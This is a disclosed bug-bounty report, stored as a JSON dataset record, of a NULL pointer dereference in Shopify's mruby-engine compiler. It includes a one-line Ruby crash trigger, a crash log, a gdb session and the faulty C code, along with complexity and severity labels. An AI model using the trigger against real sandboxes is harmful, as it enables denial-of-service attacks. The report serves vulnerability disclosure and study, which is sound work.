{
  "reported_to": "shopify-scripts",
  "reported_by": "jpenalbae ",
  "title": "NULL pointer dereference when parsing ternary operators",
  "content": "\nThere is a NULL pointer dereference when parsing ternary operators which will cause a crash. This could be used to cause a DoS.\nSample code causing the crash (file sample.rb is also attached):\nCode 16 Bytes\n1b = a () ? 1 : 0\nNote that a () should be treated as a method call which in this case is also undefined, but when adding a blank in between the a and () it causes a crash (Find full crash attached as crash.log):\nCode 4.22 KiB\n1$ bin/sandbox /tmp/sample.rb\n2bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000000\n3ruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]\n4\n5-- Control frame information -----------------------------------------------\n6c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\n7c:0002 p:0201 s:0005 E:000a48 EVAL   bin/sandbox:20 [FINISH]\n8c:0001 p:0000 s:0002 E:000380 (none) [FINISH]\n9\n10-- Ruby level backtrace information ----------------------------------------\n11bin/sandbox:20:in `<main>'\n12bin/sandbox:20:in `sandbox_eval'\n13\n14-- Machine register context ------------------------------------------------\n15 RIP: 0x00007f5de668c3df RBP: 0x00007f5de5237ef4 RSP: 0x00007ffdcbdda5e0\n16 RAX: 0x00007f5de5237e2c RBX: 0x00007f5de523f830 RCX: 0x0000000000000000\n17 RDX: 0x00007f5de66e710c RDI: 0x00007f5de5237f0c RSI: 0x0000000000000000\n18  R8: 0x0000000000000000  R9: 0x00007f5de52055d0 R10: 0x0000000000000001\n19 R11: 0x0000000000000001 R12: 0x00007f5de52055d0 R13: 0x0000000000000005\n20 R14: 0x0000000000000001 R15: 0x00007f5de5237f24 EFL: 0x0000000000010217\n21\n22-- C level backtrace information -------------------------------------------\n23/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea978ea5]\n24/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea9790dc]\n25/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea853364]\n26/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea904dbe]\n27/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f5dea5d7ed0]\n28/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(codegen+0x37f) [0x7f5de668c3df] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1361\n29/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(gen_values+0x52) [0x7f5de6692eb2] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:825\n30/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(gen_call.isra.12+0x101) [0x7f5de66934c1] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:855\n31/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(codegen+0x3722) [0x7f5de668f782] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1533\n32/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(codegen+0x30d8) [0x7f5de668f138] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1637\n33/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(codegen+0x2e9e) [0x7f5de668eefe] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1233\n34/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(scope_body.isra.17+0x3e) [0x7f5de6694b2e] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:718\n35/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(codegen+0x2187) [0x7f5de668e1e7] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1528\n36/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_generate_code+0xda) [0x7f5de669663a] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:2890\n37/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(me_mruby_engine_generate_code+0x7a) [0x7f5de665800a] ../../../../ext/mruby_engine/mruby_engine.c:226\n38/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(ext_mruby_engine_eval+0x89) [0x7f5de665a619] ../../../../ext/mruby_engine/ext.c:193\n39/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea9667bb]\n40/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea9746a3]\n41/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea9756d3]\n42/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea96a509]\n43/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea96f342]\n44/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea85671d]\n45/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3(ruby_exec_node+0x1d) [0x7f5dea85811d]\n46/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3(ruby_run_node+0x1e) [0x7f5dea85a25e]\n47ruby [0x40089b]\n48/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0) [0x7f5de9883730]\n49ruby(_start+0x29) [0x4008c9]\nIf we run it under gdb:\nCode 1.51 KiB\n1$ gdb --args /usr/bin/ruby bin/sandbox /tmp/sample.rb\n2(gdb) r\n3Starting program: /usr/bin/ruby bin/sandbox /tmp/sample.rb\n4[Thread debugging using libthread_db enabled]\n5Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n6[New Thread 0x7ffff7ff5700 (LWP 26490)]\n7\n8Program received signal SIGSEGV, Segmentation fault.\n90x00007ffff37f53df in codegen (s=s@entry=0x7ffff23a8830, tree=0x7ffff23a0f24, val=val@entry=1) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1361\n101361          node *e = tree->cdr->cdr->car;\n11(gdb) x/2i 0x00007ffff37f53df\n12=> 0x7ffff37f53df <codegen+895>:        mov    rax,QWORD PTR [rsi]\n13   0x7ffff37f53e2 <codegen+898>:        lea    rcx,[rax-0x33]\n14(gdb) i r rsi\n15rsi            0x0      0\n16(gdb) list *(0x00007ffff37f53df)\n170x7ffff37f53df is in codegen (/home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1361).\n181356        break;\n191357\n201358      case NODE_IF:\n211359        {\n221360          int pos1, pos2;\n231361          node *e = tree->cdr->cdr->car;\n241362\n251363          switch ((intptr_t)tree->car->car) {\n261364          case NODE_TRUE:\n271365          case NODE_INT:\n28(gdb) print tree\n29$2 = (node *) 0x7ffff23a0f24\n30(gdb) print tree->cdr\n31$3 = (struct mrb_ast_node *) 0x7ffff23a0f0c\n32(gdb) print tree->cdr->cdr\n33$4 = (struct mrb_ast_node *) 0x7ffff23a0e2c\n34(gdb) print tree->car\n35$5 = (struct mrb_ast_node *) 0x0\n36(gdb) print *tree\n37$6 = {\n38  car = 0x0,\n39  cdr = 0x7ffff23a0f0c,\n40  lineno = 1,\n41  filename_index = 0\n42}\n43(gdb)\nEven if gdb points that the bug is at mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1361 it is not, the bug its at the next line 1363. Below is the affected code:\nCode 429 Bytes\n1  case NODE_IF:\n2    {\n3      int pos1, pos2;\n4      node *e = tree->cdr->cdr->car;\n5\n6      switch ((intptr_t)tree->car->car) {   /* <-- tree->car happens to be NULL  */\n7      case NODE_TRUE:\n8      case NODE_INT:\n9      case NODE_STR:\n10        codegen(s, tree->cdr->car, val);\n11        return;\n12      case NODE_FALSE:\n13      case NODE_NIL:\n14        codegen(s, e, val);\n15        return;\n16      }\n17      codegen(s, tree->car, VAL);\n18      pop();\nAs we can see from gdb and the code, the bug is at switch ((intptr_t)tree->car->car) as tree->car points to a NULL which causes the NULL pointer dereference when accessing it.\nTested under latest version:\nCode 206 Bytes\n1$ date\n2Sat Nov 12 00:23:43 CET 2016\n3$ cd mruby-engine/\n4$ git rev-parse HEAD\n55a5eac4f380b5169882e8a851f0c0abcc7e2f266\n6$ cd ext/mruby_engine/mruby\n7$ git rev-parse HEAD\n86c299aae67e2e0f13a470b855298bc1efb43387a\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Uncontrolled Resource Consumption"
  ],
  "screenshots": {},
  "disclosed_date": 1481959860,
  "report_url": "https://hackerone.com/reports/181677",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a Ruby file named 'sample.rb' with the following content: 'b = a () ? 1 : 0'"
    ],
    [
      2,
      "Execute the file using the command: 'bin/sandbox /tmp/sample.rb'"
    ]
  ],
  "vuln_description": "A NULL pointer dereference vulnerability occurs when parsing ternary operators in Ruby code, specifically when there's a space between a method name and parentheses. This leads to a segmentation fault and potential DoS.",
  "reason": "The vulnerability requires understanding of Ruby's parsing behavior with ternary operators and method calls, but the triggering condition (adding a space) is relatively straightforward once identified. The core issue is in the compiler's handling of AST nodes.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}